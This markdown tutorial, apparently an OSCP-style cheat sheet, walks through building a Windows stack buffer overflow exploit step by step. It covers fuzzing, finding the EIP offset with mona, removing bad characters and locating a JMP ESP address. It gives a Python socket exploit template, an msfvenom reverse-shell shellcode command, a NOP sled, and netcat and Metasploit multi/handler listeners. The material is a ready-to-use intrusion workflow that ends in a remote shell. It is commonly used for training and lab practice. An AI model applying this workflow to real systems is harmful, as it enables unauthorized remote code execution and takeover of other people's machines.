# Developing an Exploit

<!-- TOC -->
- [Developing an Exploit](#developing-an-exploit)
  - [Crash replication & controlling EIP](#crash-replication--controlling-eip)
    - [Pattern](#pattern)
  - [Finding bad characters](#finding-bad-characters)
  - [Finding a jump point](#finding-a-jump-point)
    - [JMP ESP - Inside the .exe](#jmp-esp---inside-the-exe)
    - [JMP ESP - inside a DLL](#jmp-esp---inside-a-dll)
  - [Return address](#return-address)
  - [Generate payload](#generate-payload)
  - [Prepend NOPs](#prepend-nops)
  - [Multihandler Listener](#multihandler-listener)
  - [References](#references)

<!-- /TOC -->

 Use fuzzer.py or fuzzer2.py, until the application crash inside Immunity Debugger. Fuzzing a program to make it crash:

- [Fuzzer 1](ExploitDevelopment/files/fuzzer1.py)
- [Fuzzer 2](ExploitDevelopment/files/fuzzer2.py)

You just have to modify those two variables of the scripts above :

- IP
- PORT When the application crashes, EIP should be equal to 41414141 (hex value of "AAAA").

Setting up `mona.py` program working forlder `!mona config -set workingfolder C:\Program Files (x86)\Immunity Inc\Immunity Debugger\%p`

## Crash replication & controlling EIP

### Pattern

We can generate a cyclic pattern to find the exact offset of the crash with or you can use metasploit to do the job:

```text
# Mona
!mona pc <SIZE>

# Metasploit
msf-pattern_create -l <SIZE>
```

The size must be higher than the crash offset. Now modify the payload variable by the cyclic pattern :

```python
##!/usr/bin/env python3
# exploit.py

import socket
ip = "<IP>"
port = <PORT>

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

Re-run the exploit, the application should crash. To find the exact offset of the crash use:
`!mona findmsp -distance <SIZE>` Size is the same as the one used to create the pattern. The result should be something like:
`EIP contains normal pattern : ... (offset XXXX)` Get the offset, modify in exploit.py:

- The `offset` variable by the offset
- The `retn` variable by "BBBB"
- Remove the **payload** variable

```python
offset = <OFFSET>
overflow = "A" * offset
retn = "BBBB"
payload = ""
```

Re-run `exploit.py`, EIP should be equal to 42424242 (hex value of "BBBB"). You now control EIP!

## Finding bad characters

Certain byte characters can cause issues in the development of exploits. We must run every byte through the program to see if any characters cause issues. By default, the null byte (\x00) is always considered a bad character as it will truncate shellcode when executed. We will send bad characters recursively and analyze if they need to be removed. Let generate the list of bad characters with mona: `!mona bytearray -b "\x00"`

Copy the results in the variable payload. And re-run exploit.py, the application should crash. Now to found those bad characters use this command : `!mona compare -f C:\mona\<PATH>\bytearray.bin -a <ESP_ADDRESS>`

If BadChars are found, we need to exclude them as well.

```text
!mona bytearray -b "\x00 + <BAD_CHARS>"
# Example
!mona bytearray -b "\x00\x01\x02\x03"
```

Then compare again : `!mona compare -f C:\mona\<PATH>\bytearray.bin -a <ESP_ADDRESS>` Repeat those two steps until the results status returns Unmodified, this indicates that no more bad characters exist.

## Finding a jump point

### JMP ESP - Inside the .exe

`!mona jmp -r esp -cpb "<BAD_CHARS>"`

### JMP ESP - inside a DLL

`!mona modules` We need to found a .dll were Rebase, SafeSEH, ASLR, NXCompat are sets to False. When you found it, run the command below to search for a JMP ESP (FFE4), inside the dll: `!mona find -s "\xff\xe4" -m <DLL>`

## Return address

Choose an address in the results and update `exploit.py`:

- Setting the retn variable to the address, written backwards (little-endian)

  ```text
  # Example of a JMP ESP address
    0x625011af
  # exploit.py
    retn = "\xaf\x11\x50\x62"
  ```

## Generate payload

Now we generate our shellcode without the badchars that we found:
  `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "<BAD_CHARS>" -f c`
Copy the generated shellcode and update `exploit.py`:

- Setting the payload variable equal to the shellcode

## Prepend NOPs

A NOP-sled is a technique for exploiting stack buffer overflows. It solves the problem of finding the exact address of the buffer by effectively increasing the size of the target area, `\x90` represents a NOP in assembly. This instruction will literally do nothing and continue on with code execution.
`padding = "\x90" * 16`
Start a listener
`nc -lvp <PORT>`

## Multihandler Listener

To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,

```shell
msf>use exploit/multi/handler
msf>set payload windows/meterpreter/reverse_tcp
msf>set lhost <ip>
msf>set lport <port>
msf>set ExitOnSession false
msf>exploit -j
```

The -j option is to keep all the connected session in the background.

## References

<https://kb.help.rapid7.com/discuss/598ab88172371b000f5a4675>
<https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/>
<http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/>
